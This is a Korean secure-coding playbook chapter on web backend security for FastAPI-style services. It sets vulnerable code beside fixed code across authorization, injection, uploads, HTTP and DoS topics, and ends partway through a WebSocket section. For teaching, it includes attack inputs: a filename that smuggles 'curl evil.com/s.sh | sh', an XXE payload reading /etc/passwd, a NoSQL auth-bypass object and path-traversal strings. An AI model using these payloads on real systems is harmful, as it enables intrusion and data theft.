# 웹 백엔드 보안 — 코드 레벨 (PLAYBOOK §24)

> 웹 프레임워크로 백엔드를 작성·리뷰할 때 반드시 확인해야 하는 항목.
> 예시 코드는 FastAPI/Starlette/SQLAlchemy 기준이지만, 원리는 프레임워크 무관.
>
> 프레임워크 기본 방어와 애플리케이션 책임을 구분한다. 설치 버전·parser·proxy·실행 설정을 확인한다.
> 코드 조각은 해당 위험의 예시이며 완성형 인증·업로드·네트워크 방어 구현이 아니다.
>
> 설정·인프라·운영 쪽(보안 헤더, 개인정보, 공급망, 백업)은 `security-ops.md`에 있다.

## 목차

- §0 핵심 원칙 4가지 + 작업 우선순위
- §1 권한/인가 — IDOR/BOLA, 기본 거부, mass assignment
- §2 인증 — 비밀번호·세션, 계정 복구, JWT, OAuth, MFA, 계정 열거
- §3 인젝션 — SQL, NoSQL, 커맨드, SSTI, XXE, CRLF, 역직렬화, ReDoS
- §4 파일 업로드 — 바디 크기, 압축 폭탄, 저장·서빙, path traversal, zip slip
- §5 HTTP 프로토콜 — Host 헤더, 프록시 헤더, open redirect, SSRF, CORS, CSRF, smuggling
- §6 DoS/가용성 — slowloris, 이벤트 루프 블로킹, 커넥션 풀, 타임아웃, 쿼리 제한
- §7 동시성/비즈니스 로직 — race condition, 멱등성, 금액 처리
- §8 클라이언트/프론트 — XSS, WebSocket, GraphQL
- 부록 A 리뷰 시 빠르게 훑는 체크리스트
- 부록 B "프레임워크가 해주겠지"라고 오해하기 쉬운 것들

---

## §0. 핵심 원칙 4가지

작업 중 판단이 애매하면 이 4개로 되돌아온다.

1. **입력 계약을 검증한다** — 타입·길이·범위·허용 필드·중첩·업무 상태를 제한한다.
   Pydantic strict·`extra="forbid"`는 수단이며 타입 검증만으로 injection·인가가 해결되지는 않는다.
2. **데이터와 코드를 절대 섞지 않는다** — 파라미터 바인딩, `shell=False`,
   템플릿 분리, `safe_load`. 인젝션 전체의 근본 원인.
3. **모든 접근에 소유권/권한 조건을 건다** — 그리고 미들웨어·의존성으로 강제해서
   개별 핸들러에서 빼먹을 수 없게 만든다.
4. **불변 조건을 DB에 박는다** — UNIQUE, CHECK, 원자적 UPDATE.
   앱 로직 검사는 동시성 상황에서 무너진다.

### 작업 우선순위

다음은 점검 순서의 출발점이며 사고 빈도의 통계 순위가 아니다.
현재 위협 모델·실제 악용·노출·영향·도달 가능성에 따라 조정한다.

1. 자원·행위·tenant 인가 — §1
2. 인증·계정 복구·세션 수명 — §2
3. injection·위험 parser — §3
4. 자원 상한·가용성 — §4, §6
5. 브라우저·배포 경계 — §5, §8, [운영 보안](security-ops.md)

OWASP 항목의 나열 순서나 독립 항목 포함 여부만으로 실제 사고 비중·특정 앱의 위험을 추정하지 않는다.

---

## §1. 권한/인가 (최우선)

### §1.1 IDOR / BOLA — 소유권 검사 누락

```python
# ❌ 로그인만 확인하고 "이게 이 사용자 것인지"는 확인하지 않음
@app.get("/orders/{order_id}")
def get_order(order_id: int, user = Depends(current_user)):
    return db.get(Order, order_id)   # id를 1,2,3... 순회하면 전부 조회됨
```

```python
# ✅ 소유권을 쿼리 조건에 포함
order = db.scalar(
    select(Order).where(Order.id == order_id, Order.user_id == user.id)
)
if not order:
    raise HTTPException(404)   # 403이 아니라 404 (존재 여부도 정보다)
```

가능하면 조회 조건에 권한 범위를 포함한다. 별도 policy engine에서 판단할 때도 결과 사용 전에
객체·행위·tenant를 연결하고 검사와 실행 사이 상태 변경(TOCTOU)을 처리한다. 조회 후 검사가 항상 잘못된 것은 아니다.
UUID 사용은 완화책이지 해결책이 아니다 (URL은 로그·리퍼러로 샌다).

### §1.2 권한 검사를 구조로 강제 (기본 거부)

```python
# 라우터 단위로 강제
admin = APIRouter(prefix="/admin", dependencies=[Depends(require_role("admin"))])

# 리소스 접근은 의존성으로 통일 — 핸들러가 객체를 못 받으면 아예 진입 불가
async def owned_order(order_id: int, user=Depends(current_user), db=...) -> Order:
    o = await db.scalar(
        select(Order).where(Order.id == order_id, Order.user_id == user.id)
    )
    if not o:
        raise HTTPException(404)
    return o

@app.get("/orders/{order_id}")
async def get(order: Order = Depends(owned_order)):
    return order
```

- 함수·객체 인가를 공통 policy/dependency와 거부 기본값으로 누락하기 어렵게 만들고 거부 사례 테스트로 확인한다.
- tenant context·RLS·실행 role·pool 경계는 [DB 설계](database-design.md)를 따른다.
  RLS가 모든 명령·관리자·SQL injection 경로를 막는다고 가정하지 않는다.

### §1.3 Mass Assignment / 과도한 데이터 노출

Pydantic을 쓴다고 안전한 게 아니라, **입력용/출력용 모델을 분리했는지**의 문제다.

```python
# ❌ DB 모델을 그대로 입력에 사용 → is_admin, balance까지 받아버림
@app.post("/users")
def create(data: UserTable): ...
```

```python
# ✅ 입출력 스키마 분리
class UserCreate(BaseModel):
    model_config = ConfigDict(extra="forbid")   # 모르는 필드는 422
    email: EmailStr
    password: str

class UserOut(BaseModel):        # password_hash는 절대 나가지 않음
    id: int
    email: str

@app.post("/users", response_model=UserOut)
def create(data: UserCreate): ...
```

응답의 허용 필드를 명시한다. FastAPI의 `response_model`은 한 수단이며 명시적 DTO·serializer도 가능하다.
raw Response·예외·추가 endpoint를 포함해 해시·토큰이 나오지 않는지 확인한다.

---

## §2. 인증

### §2.1 비밀번호 / 세션

- 비밀번호는 Argon2id 등 검증된 password KDF를 우선 검토한다. 기존 bcrypt는 길이 제한·비용·
  지원 구현·migration을 확인한다. 비용은 공식 최소 권고와 실제 지연·동시 부하·DoS 예산으로 정한다.
  빠른 SHA-256 단독은 비밀번호용이 아니다. 고엔트로피 API key verifier와는 [구분](api-key-security.md)한다.
- 로그인 성공 시 세션 ID 재발급 (세션 고정 공격 방어).
- 로그인/비번재설정/OTP 엔드포인트는 **IP + 계정 양쪽으로** 레이트리밋
  (크리덴셜 스터핑 방어).
- 민감 작업(비번 변경, 결제수단 추가, 이메일 변경)에는 **재인증** 요구.
- 사용자에게 활성 세션 목록 + 원격 로그아웃 제공. 새 기기/새 지역 로그인 알림.

> password KDF의 근거: [OWASP Password Storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html).
> `auth-jwt.md`의 custom claim·Redis 키는 선택형 예시이며 이 저장소 전체의 실행 계약이 아니다.

### §2.2 계정 복구 — 가장 약한 고리

비밀번호를 아무리 강하게 해도 **재설정 경로가 뚫리면 끝난다.**

- 토큰은 `secrets.token_urlsafe(32)`.
- 원문 대신 검증값을 저장한다. 유출 시 즉시 사용 가능한 원문을 줄이지만 발급·검증 코드 침해까지 방어하지는 않는다.
- 짧은 만료·단발 사용을 서버가 강제한다. 15~30분은 예시이며 원자적 소비·동시 요청을 검증한다.
- 재설정 완료 시 **기존 세션 전부 무효화**.
- 이메일 변경 시 **기존 주소에도 알림** — 탈취 감지의 마지막 방어선.
- 재설정 링크 생성 시 **요청 Host 헤더를 쓰지 않는다** (§5.1).

### §2.3 JWT

JWT의 algorithm·issuer·audience·token type·만료·신뢰한 키와 unknown kid·회전·폐기는
[JWT·JWKS 기준](jwt-jwks.md)을 따른다. `RS256`은 비대칭 서명 선택 예이며 모든 JWT에 강제하지 않는다.
서명만으로 계정 활성·객체 인가·즉시 철회가 보장되지 않는다.
브라우저의 토큰 위치·BFF·TMB·XSS·CSRF는 [브라우저 backend](browser-backends.md)를 따른다.
프로젝트가 custom claim·refresh rotation을 유지한다면 [JWT 예시](auth-jwt.md)의 적용 조건을 확인한다.
이전 예시에 있던 `sessionStorage`·`localStorage` 분리 저장을 공통 기본값으로 삼지 않는다.

### §2.4 OAuth / 소셜 로그인

- `state` 파라미터 필수 (CSRF). 세션에 저장 후 대조.
- PKCE 사용 (public client면 필수).
- `redirect_uri`는 **정확히 일치** 검증. prefix 매칭하면 `https://ok.com.evil.com` 통과.
- **이메일 기반 계정 병합 주의**: 공급자의 `email_verified`를 확인하지 않으면
  남의 계정을 탈취할 수 있다.

### §2.5 MFA

- TOTP 시크릿은 암호화 저장, 백업코드는 해시로.
- 사용한 코드 재사용 방지 (사용 이력 기록).
- **MFA 우회 경로 점검**: 레거시 API, 리멤버미 쿠키, 계정복구가 MFA를 건너뛰는지.

### §2.6 타이밍 / 계정 열거

- 비밀번호는 KDF 라이브러리의 verify로 검사한다. digest·고정 secret 비교에는 `secrets.compare_digest()` 등
  검증한 상수 시간 비교를 사용한다. 단순 문자열 비교를 비밀번호 검증 대신 쓰지 않는다.
- 존재하지 않는 유저면 해싱을 건너뛰어 응답이 빨라진다
  → 필요하면 같은 비용의 dummy verifier를 쓰고 실제 응답 시간 분포를 확인한다. 완전 동일 시간 보장은 아니다.
  비싼 KDF 전에 호출량·동시성 상한을 둬 인증 실패 DoS도 제한한다.
- 에러 메시지 통일: "이메일 없음" vs "비번 틀림"을 구분하면 계정이 열거된다.
- 회원가입/비번찾기 응답도 통일: "해당 이메일로 안내를 보냈습니다".

---

## §3. 인젝션

### §3.1 SQL — ORM을 써도 뚫리는 지점

```python
# ❌ text()에 f-string
db.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))

# ❌ 정렬/컬럼명 — 바인딩 파라미터로 넣을 수 없어서 실제로 가장 많이 뚫리는 곳
db.execute(text(f"SELECT * FROM posts ORDER BY {sort_col} {direction}"))

# ✅ 값은 바인딩
db.execute(text("SELECT * FROM users WHERE name = :n"), {"n": name})

# ✅ 식별자는 화이트리스트만
ALLOWED = {"created_at": Post.created_at, "views": Post.views}
col = ALLOWED.get(sort_col)
if col is None:
    raise HTTPException(400)
```

### §3.2 NoSQL 인젝션

MongoDB는 JSON이 그대로 쿼리가 된다.

```json
{"username": "admin", "password": {"$ne": null}}
```
→ 비밀번호 검사가 통째로 우회된다.

`password: str` 같은 입력 schema는 객체 형태 주입을 줄인다. 비신뢰 입력을 쿼리 연산자로
그대로 전달하지 않고 허용 필드·연산자를 별도로 검증한다. `Any`의 존재만으로 취약점을 확정하지 않는다.

### §3.3 커맨드 인젝션

`ffmpeg`, `imagemagick`, `pdftotext` 호출 시 자주 발생.

```python
# ❌
subprocess.run(f"ffmpeg -i {filename} out.mp4", shell=True)
#    filename = "a.mp4; curl evil.com/s.sh | sh"

# ✅
subprocess.run(["/usr/bin/ffmpeg", "-i", path, out],
               shell=False, timeout=30, check=True)
```

리스트로 넘겨도 **파일명이 `-`로 시작하면 인자로 해석된다**(argument injection).
`./`를 붙이거나 `--` 구분자를 쓴다.

### §3.4 SSTI (템플릿 인젝션)

```python
Template(user_input)   # ❌ 절대 금지 — RCE까지 체인 가능
```

**규칙: 템플릿 문자열은 절대 사용자 입력에서 오지 않는다. 데이터는 변수로만.**
관리자가 이메일 템플릿을 편집하는 기능도 위험 →
`SandboxedEnvironment` + 최소 권한.

### §3.5 XXE (XML 파싱)

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
```
→ 파일 읽기 + SSRF + DoS(billion laughs).

XML parser·버전별 entity·DTD·network 기본값을 확인한다. 기본값만으로 자원 고갈 방어까지 가정하지 않는다.

```python
from defusedxml import ElementTree   # 가장 안전
# 또는
parser = etree.XMLParser(resolve_entities=False, no_network=True, huge_tree=False)
```

**SVG 업로드도 XML이다.** SVG는 XXE와 XSS 둘 다 가능하다.

### §3.6 CRLF / 로그 인젝션

Starlette은 헤더 값의 개행을 막아주지만 **로그는 막아주지 않는다.**

```python
logger.info(f"login failed: {username}")
# username = "a\n2026-08-30 INFO login success: admin"  → 로그 위조
```
→ 개행 이스케이프 또는 JSON 구조화 로깅 사용 (`logging.md`의 structlog 설정이 이걸 만족한다).
이메일도 같은 원리로 `To`/`Subject`에 개행을 넣어 BCC를 추가하는 공격이 있다.

### §3.7 코드 실행 계열 (한 번에 서버 장악)

- `pickle.loads()` — 신뢰할 수 없는 데이터면 **즉시 RCE**.
  세션·캐시·큐 페이로드에 pickle을 쓰는 것이 대표적 사고 유형.
- `yaml.load()` → **반드시** `yaml.safe_load()`.
- `torch.load()`, `joblib.load()` — 내부가 pickle이다.
  **인터넷에서 받은 ML 모델 로드도 RCE 벡터.** `weights_only=True` 또는 safetensors.
- `eval` / `exec` / `subprocess(shell=True)`.

### §3.8 ReDoS (정규식 DoS)

Python `re`와 Java의 일반 정규식 엔진은 backtracking을 사용하지만 같은 구현은 아니다.
복잡도·timeout·입력 제한은 엔진·패턴·버전에 따라 검증한다.
`(a+)+$` 같은 패턴에 긴 입력을 주면 지수 시간으로 CPU가 포화된다.
실측(`refs/redos-lab/`): 입력 한 글자마다 시간이 두 배 — 28자 5초, 31자 40초. 코어 하나가 통째로 묶인다.

대응(위에서부터 권장):

```python
# (a) google-re2 — 유한오토마타 기반, 백트래킹 자체가 없어 항상 선형시간
import re2
re2.search(r"(a+)+$", evil)
# 단점: lookahead/backreference 미지원 (입력 검증용에는 보통 불필요)

# (b) regex 모듈 — 타임아웃 지원
import regex
regex.search(pattern, s, timeout=0.2)
```

```python
# (c) Pydantic v2의 rust-regex 선택 예시. custom validator·다른 엔진도 별도 점검
class Model(BaseModel):
    model_config = ConfigDict(regex_engine="rust-regex")  # 기본값
    email: str = Field(pattern=r"^[\w.]+@[\w.]+$")
```

> backtracking 엔진이나 compiled pattern·custom validator를 사용하면 선형 엔진과 같은 보장을 가정하지 않는다.
> 기능 요구로 바꾸는 경우 패턴·입력 상한·timeout·격리·최악 입력을 검증한다.

무엇을 쓰든:
- 정규식 실행 **전에 입력 길이를 자른다** (`if len(s) > 256: reject`). 가장 싸고 효과적.
- `(x+)+`, `(x|x)*`, `(.*a){10}` 같은 중첩 수량자를 리뷰에서 잡는다.
- 사용자 제공 패턴은 RE2 같은 제한된 엔진을 우선 검토한다. 패턴 길이·컴파일 비용·메모리·실행량도 제한한다.

---

## §4. 파일 업로드 / 역직렬화

### §4.1 바디 크기 제한

업로드 parser·버전별 spool 임계치·파일/필드 개수·body 크기 제한을 확인한다.
메모리 spool을 넘으면 디스크를 사용하므로 임시 공간·동시 업로드도 제한한다.
Content-Length 사전 검사와 별개로 실제 읽은 바이트·압축 해제 크기·읽기 시간 예산을 집행한다.
proxy 제한과 앱의 스트리밍 제한을 함께 검증한다.
ASGI `receive` 경로에서 세는 방식은 선택지다. 미들웨어 순서·이미 시작된 응답·disconnect·
framework 예외 변환을 처리해야 하며, 일부 코드 조각만으로 완성형 미들웨어라고 간주하지 않는다.
저장소의 실험 구현은 `refs/asgi-body-limit/max_body_size.py`에 있다. standalone skill에 포함된 실행 파일은 아니다.

### §4.2 이미지 압축 폭탄 / 메타데이터

작은 압축 파일도 디코딩하면 거대한 픽셀 버퍼가 된다. 50,000×50,000은 **25억 픽셀**이고,
RGBA 8-bit 버퍼 하나만 약 10GB다. 변환·리사이즈의 중간 복사본은 별도다.
한 요청으로도 DoS가 가능하며 여러 출발지에서 반복하면 DDoS로 이어질 수 있다.

- 업로드 바이트뿐 아니라 디코더가 읽은 폭·높이·총 픽셀을 **load/convert/resize 전** 제한한다.
  클라이언트가 제출한 치수, 확장자, Content-Type, 매직바이트만으로 안전을 판단하지 않는다.
- 애니메이션·다중 페이지는 프레임 수·프레임별 크기·누적 디코딩 픽셀·처리 시간을 함께 제한한다.
  첫 프레임만 쓸 서비스는 다중 프레임을 거절하는 등 지원 정책을 명시한다.
- 출력 크기·배율·동시 처리·큐·임시 디스크도 제한한다. 작은 thumbnail 출력만으로 입력 decode가 저렴해지지 않는다.
- 헤더 parser에도 비용과 취약점이 있다. 최신 디코더를 최소 권한의 격리 worker에서 실행하고
  OS/container 메모리·CPU 상한과 실행 시간 초과 시 worker 종료를 둔다. async timeout만으로 CPU 디코딩을 멈출 수 없다.

Pillow를 쓴다면 다음은 **단일 프레임 PNG/JPEG용 사전 검사 예시**다. 정책 수치는 서비스에 맞춰 조정한다.
바디 제한·worker 격리·정상 재인코딩을 대체하는 완성형 업로드 API가 아니다.

```python
# ❌ 바이트 크기나 출력 thumbnail만 제한한 뒤 바로 convert()한다.
# ✅ 제한된 입력 스트림을 worker에 전달하고 디코딩 전 치수를 검사한다.
import warnings
from PIL import Image

Image.MAX_IMAGE_PIXELS = 20_000_000  # 전용 worker 시작 시 한 번 설정
warnings.simplefilter("error", Image.DecompressionBombWarning)

def inspect_and_decode(fp):
    with Image.open(fp, formats=("PNG", "JPEG")) as image:
        width, height = image.size
        if not (0 < width <= 10_000 and 0 < height <= 10_000):
            raise ValueError("image dimensions exceed policy")
        if width * height > 20_000_000 or getattr(image, "n_frames", 1) != 1:
            raise ValueError("pixel or frame budget exceeded")
        image.load()  # 여기도 worker 메모리·시간 상한 안에서 실행
        # 여기서 필요 픽셀을 새 이미지로 복사해 허용 형식으로 재인코딩한다.
        # 원본 info/EXIF/ICC/XMP를 출력에 자동 복사하지 않는다.
```

Pillow의 경고·오류 제한을 해제하지 않는다. `verify()`나 헤더 검사만으로 전체 decode 안전을 보장하지 않는다.
EXIF·ICC·XMP 등 메타데이터도 바이트 상한을 두며 GPS 같은 불필요 정보는 출력에서 제거한다.
`getdata()` 자체가 메타데이터를 삭제하는 것은 아니다. EXIF 회전·색상 변환도 제한된 worker에서 수행한다.
SVG는 래스터 픽셀 검사와 별개로 script·외부 참조·filter 복잡도·출력 canvas 상한을 검사한다.

검증은 작은 테스트 한도를 사용해 경계 치수·작은 파일/큰 치수·다중 프레임·손상 파일·timeout·
worker 강제 종료 후 복구·동시성 제한을 확인한다. 실제 수십 GB 이미지를 운영 환경에서 디코딩하지 않는다.
거절 횟수·decode 시간·worker OOM·큐 포화를 관측하고 `incident-response.md`의 제한·알림에 연결한다.

근거: [Pillow Image의 lazy loading·decompression bomb](https://pillow.readthedocs.io/en/stable/reference/Image.html),
[OWASP 파일 업로드](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html).

### §4.3 저장 / 서빙

- **사용자가 준 파일명을 절대 쓰지 않는다.**
  `../../etc/passwd`, `..\\`, 널바이트가 들어온다.
  → `uuid4().hex + 검증된 확장자`로 새로 만든다.
- 업로드 디렉터리는 **웹 루트 밖에** 둔다.
- 서빙 시 `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff`
  (`security-ops.md §9`). 안 하면 업로드된 HTML이 내 도메인에서 실행되어 저장형 XSS가 된다.

### §4.4 Path Traversal (다운로드)

```python
# ❌
FileResponse(f"./uploads/{name}")   # name="../../.env"

# ✅
base = Path("./uploads").resolve()
target = (base / name).resolve()
if not target.is_relative_to(base) or not target.is_file():
    raise HTTPException(404)
```

`%2e%2e%2f`, `..%c0%af`, 널바이트, 유니코드 정규화 우회가 전부 존재한다.
문자열 필터보다 정규화 후 경계 비교를 사용한다. 위 예시만으로 symlink 교체 경쟁을 막지는 못한다.
공격자가 디렉터리를 변경할 수 있으면 안전한 dir-relative open·symlink 금지·쓰기 권한 격리 등을 추가한다.
`StaticFiles`로 마운트한 디렉터리에 `.env`나 백업 파일이 없는지 확인한다.

### §4.5 Zip Slip / 압축 폭탄

```python
base = Path("/data/extract").resolve()
for m in zf.infolist():
    dest = (base / m.filename).resolve()
    if not dest.is_relative_to(base):        # 현재 파일시스템의 경계 검사; archive link는 별도 거부
        raise ValueError("zip slip")
    if m.file_size > 50 * 1024**2:           # 압축 해제 후 크기 (42.zip 대비)
        raise ValueError("bomb")
```

archive의 link·특수 파일은 거부하고 경로 교체 경쟁도 제한한다. metadata의 `file_size`만 믿지 않고
실제 해제한 바이트·총합·파일 수·중첩·시간·디스크를 제한한다. 압축비는 보조 신호이며 100배 같은 값은 정책 예시다.

---

## §5. HTTP 프로토콜 레벨

### §5.1 Host 헤더 인젝션

```python
# ❌ 비번 재설정 링크를 요청 Host로 생성
link = f"https://{request.headers['host']}/reset?token={t}"
# 공격자가 Host: evil.com을 보내면 토큰이 공격자에게 배달된다
```

**설정에 박힌 도메인만 사용한다.**

```python
app.add_middleware(TrustedHostMiddleware, allowed_hosts=["api.example.com"])
```
nginx에서도 알 수 없는 Host는 444로 끊는다.

### §5.2 프록시 헤더 위조

```python
ip = request.headers["X-Forwarded-For"]   # ❌ 클라이언트가 마음대로 설정 가능
```

레이트리밋을 이걸로 하면 헤더만 바꿔서 무한 우회된다.
신뢰하는 프록시 뒤에서만 사용하고 소스를 제한한다:

```bash
uvicorn app:app --proxy-headers --forwarded-allow-ips="10.0.0.1"
```
신뢰한 proxy 체인을 오른쪽부터 검증하고 첫 비신뢰 주소를 구분한다. 고정 홉 수만 믿으면
직접 접근·가변 경로에서 위조될 수 있으므로 실제 ingress·proxy의 헤더 정리 계약을 확인한다.

### §5.3 Open Redirect

```python
# ❌ 로그인 후 next 파라미터를 그대로 사용
return RedirectResponse(next_url)   # next=//evil.com

# ✅ URL 문자열 검사를 직접 조립하기보다 서버의 고정된 route ID를 매핑
next_url = {"home": "/", "account": "/account"}.get(next_route, "/")
```
`//evil.com`, `/\evil.com`, `https:/evil.com`이 전부 우회 케이스다.

### §5.4 SSRF

"URL을 입력받아 서버가 fetch"하는 기능이 있으면 반드시 처리한다.
웹훅, 이미지 URL 임포트, 링크 미리보기 전부 해당.

허용 scheme·host·port·목적지 정책을 먼저 정하고 URL parser로 검증한다.
DNS의 모든 A/AAAA 결과·IPv4-mapped IPv6·loopback·private/link-local·metadata 경로를 검사한다.
검사한 IP와 실제 연결 IP를 결합하거나 검증한 egress proxy를 사용해 DNS rebinding/TOCTOU를 처리한다.
redirect는 기본 비활성화하거나 각 hop의 URL·DNS·연결을 다시 검사한다. redirect 제한만으로 rebinding이 해결되지는 않는다.
TLS hostname 검증·응답 크기·연결/전체 시간 예산·허용 egress를 함께 적용한다.
클라우드 metadata 접근 차단·IMDSv2 같은 플랫폼 방어도 추가하되 전체 SSRF 방어로 설명하지 않는다.

### §5.5 CORS

```python
# ❌ 이 조합은 브라우저가 거부하거나, 되게 만들면 전면 개방
allow_origins=["*"], allow_credentials=True
```

- 와일드카드 대신 도메인 명시 (§19.10, `auth-jwt.md` — origins는 환경 변수로).
- 가능하면 정확한 origin 목록을 사용한다. regex가 필요하면 scheme·hostname·port 전체를
  full match로 검증하고 혼동 가능한 접두/접미·악성 subdomain을 검사한다. 끝 앵커 하나만으로 충분하지 않다.

### §5.6 CSRF

브라우저가 자동 첨부하는 cookie 등 ambient credential 경로에 CSRF 방어를 적용한다.
명시적 Authorization만 쓰는 API도 로그인·refresh·쿠키 fallback 경로는 별도로 확인한다.
적절한 SameSite·Origin 검증과 synchronizer token 또는 세션에 묶인 signed double-submit 등을 선택한다.
단순 cookie/body 값 일치만으로 모든 공격이 막히지는 않는다. 검증한 framework·library를 우선 사용한다.

### §5.7 Request Smuggling / 캐시 오염

- **Smuggling**: 프론트(nginx)와 백(uvicorn)이 `Content-Length` vs `Transfer-Encoding`을
  다르게 해석하면 숨긴 요청이 **다른 사용자 요청 앞에 붙는다** → 인증 우회, 세션 탈취.
  proxy·서버 조합의 최신 수정·일관된 HTTP 해석·모호한 요청 거부를 확인한다.
  연결 재사용 제한 같은 완화는 해당 제품 공지·성능·회귀 검증으로 선택한다.
- **캐시 오염**: 캐시 키에 없는 헤더가 응답에 반영되면 오염된 응답이 전체에 배포된다.
- **캐시 기만**: `/account.json` 같은 확장자를 붙여 CDN이 개인정보를
  정적 파일로 캐싱하게 만든다.
  → 개인화 응답에 `Cache-Control: private, no-store` 명시, `Vary` 정확히 설정.

---

## §6. DoS / 가용성

### §6.1 연결 폭주 / Slowloris

경계 proxy·서버의 연결/읽기 제한과 앱의 비용·동시성 제한을 함께 적용한다.
아래 수치는 설정 예시이며 nginx context·버전·정상 부하·streaming 요구에 맞춰 검증한다.

```nginx
client_max_body_size 10m;
client_header_timeout 10s;   # 헤더 천천히 보내기 차단
client_body_timeout 10s;     # 바디 천천히 보내기 차단
send_timeout 10s;

limit_conn_zone $binary_remote_addr zone=perip:10m;
limit_req_zone  $binary_remote_addr zone=reqs:10m rate=20r/s;

server {
    limit_conn perip 20;
    limit_req  zone=reqs burst=40 nodelay;
}
```

```bash
uvicorn app:app --limit-concurrency 200 --timeout-keep-alive 5 --backlog 2048
```

앱 레벨 레이트리밋(`slowapi` + Redis)은 부가적으로만.
회선을 포화시키는 L3/L4 공격은 앱 단독으로 해결되지 않는다. 공급자의 filtering/scrubbing·DDoS 서비스·
용량과 대응 연락 경로를 검토한다. WAF만으로 모든 네트워크 공격이 해결되는 것은 아니다.

### §6.2 FastAPI 고유 함정 — 이벤트 루프 블로킹

긴 blocking/CPU 작업은 같은 이벤트 루프의 다른 요청을 지연시킨다.
프로세스 종료와 루프 정체는 다른 현상이다. 실행기 선택·GIL·상한은 [동시성](concurrency.md)을 따른다.

```python
# ❌ 이거 하나가 서버 전체를 멈춘다
@app.post("/resize")
async def bad(f: UploadFile):
    return heavy_image_processing(f.file)

# ✅ def로 선언 → 스레드풀로 자동 오프로드
@app.post("/resize")
def ok(f: UploadFile):
    return heavy_image_processing(f.file)

# ✅✅ CPU 바운드는 프로세스풀로
@app.post("/resize")
async def best(f: UploadFile):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(process_pool, heavy, data)
```

사용한 Starlette/AnyIO 버전의 thread limiter와 공유 소비자를 확인한다. 특정 기본값을 전체 실행 환경에 일반화하지 않는다.
요청 예산을 넘는 작업의 영속 처리 필요성은 [작업 계약](background-jobs.md)으로 판단한다.
(같은 원리의 파이프라인 패턴은 `async-patterns.md` §23.1.)

### §6.3 커넥션 풀 고갈

요청은 200개인데 DB 풀이 5개면 나머지는 전부 대기 → 타임아웃 → 리트라이 → 악화.

```python
create_async_engine(url,
    pool_size=20, max_overflow=10,
    pool_timeout=5,          # 무한 대기 금지. 빨리 실패해야 한다
    pool_recycle=1800,       # DB가 유휴 연결을 끊기 전에 재활용
    pool_pre_ping=True)      # 죽은 커넥션 감지
```

총 연결 예산은 API·worker·scheduler·복제본·운영 도구의 풀을 합산하고 DB의 예약 연결·여유를 뺀
가용 한도 안에 둔다. 위 수치는 예시이며 엔진·pooling 방식·실제 동시 부하로 검증한다.

세션은 요청 스코프로 확실히 닫는다(`Depends` yield 패턴, `python-api.md`).
백그라운드 작업에서 요청 세션을 재사용하지 않는다.

### §6.4 타임아웃과 재시도

```python
httpx.AsyncClient(timeout=httpx.Timeout(5.0, connect=2.0))
```

- 타임아웃이 없으면 업스트림 지연 시 연결이 쌓여 자멸한다.
- **서킷 브레이커**: 실패율이 임계를 넘으면 호출 자체를 차단(fail fast).
- 재시도에는 **지수 백오프 + 지터**. 고정 간격 재시도는
  재시도 폭풍을 만들어 복구를 방해한다.

### §6.5 쿼리 / 페이로드 제한

```python
limit: int = Query(50, le=200)   # 사용자가 limit=999999를 넣지 못하게
```

- **모든 목록 API에 limit 상한을 강제한다.** `SELECT *` 한 방에 500만 행 → 메모리 폭발.
- 깊은 `offset`은 DB가 느려진다 → 커서 페이지네이션.
- N+1 쿼리 제거(`selectinload`).

### §6.6 운영 안정성

- **헬스체크 분리**: `/livez`(프로세스 생존)와 `/readyz`(의존성 정상).
  하나로 합치면 DB가 잠깐 끊길 때 컨테이너가 무한 재시작한다.
- **graceful shutdown**: SIGTERM 후 진행 중 요청을 마칠 시간을 준다.
  배포마다 에러가 나는 원인.
- cgroup 메모리 제한으로 한 프로세스가 호스트 전체를 먹지 못하게.
- **캐시 스탬피드**: 인기 키가 만료되는 순간 수천 요청이 DB로 몰린다
  → 락 또는 TTL 지터.
- 큐에도 최대 길이 제한. 무한 큐는 메모리 폭탄이자 지연 폭탄.
- 요청 예산·복구 요구를 넘는 작업은 [백그라운드 작업](background-jobs.md)의 영속 접수·상태 계약을 적용한다.

---

## §7. 동시성 / 비즈니스 로직

자동 분석만으로 확인하기 어려운 업무 불변식·동시 실행을 별도 검증한다.

### §7.1 Race Condition (TOCTOU)

쿠폰이 1회용인데 동시에 100번 요청하면 100번 적용된다.
잔액 차감, 재고, 초대코드 전부 해당.

```python
# ❌ 읽기 → 판단 → 쓰기 사이에 틈이 있다
if coupon.used_count < coupon.limit:
    coupon.used_count += 1
```

```python
# ✅ (a) DB 레벨 락
row = db.scalar(select(Coupon).where(...).with_for_update())

# ✅ (b) 원자적 조건부 UPDATE — 더 낫다
res = db.execute(
    update(Coupon)
    .where(Coupon.id == cid, Coupon.used_count < Coupon.limit)
    .values(used_count=Coupon.used_count + 1)
)
if res.rowcount == 0:
    raise HTTPException(409)

# ✅ (c) UNIQUE 제약으로 아예 불가능하게 — (user_id, coupon_id)
```

잔액은 `balance = balance - :amt` + `CHECK (balance >= 0)`.

### §7.2 멱등성

결제 API에 재시도가 오면 이중 결제가 된다.
키를 호출자·행위·정규화한 요청 내용에 결합하고 다른 payload 재사용을 거부한다.
UNIQUE 제약과 실행·결과 기록·동시 요청 처리를 원자적으로 설계한다. 키만 저장해도 외부 부작용까지
멱등해지는 것은 아니다. [내구성 작업](background-jobs.md)의 재시도·부작용 계약을 함께 적용한다.

### §7.3 비즈니스 로직 일반

- **가격·수량을 클라이언트가 보낸 값으로 계산하지 않는다.**
  상품 ID만 받고 가격은 DB에서 조회.
- 음수 수량은 환불로 악용된다 → `Field(gt=0)`.
- 다단계 플로우(장바구니→결제→확정)에서 중간 단계를 건너뛸 수 있는지 확인.
- **금액에 부동소수점 금지** → `Decimal` 또는 정수 최소단위.

---

## §8. 클라이언트 / 프론트

### §8.1 XSS

React/Vue는 기본 이스케이프라 대부분 커버되지만 구멍은 정해져 있다:

- `dangerouslySetInnerHTML`, `v-html`
- `<a href={userInput}>` (`javascript:` 스킴)
- 마크다운 렌더링
- DOM XSS (`location.hash` → `innerHTML`)
- `postMessage` 수신 시 `event.origin` 미검증
- `window.opener` (`rel="noopener"` 필요)

사용자 HTML을 허용해야 하면 `bleach` / DOMPurify로 화이트리스트 새니타이즈.

### §8.2 WebSocket

- **Origin 헤더를 직접 검증해야 한다.** CORS가 적용되지 않고 SOP도 없어서
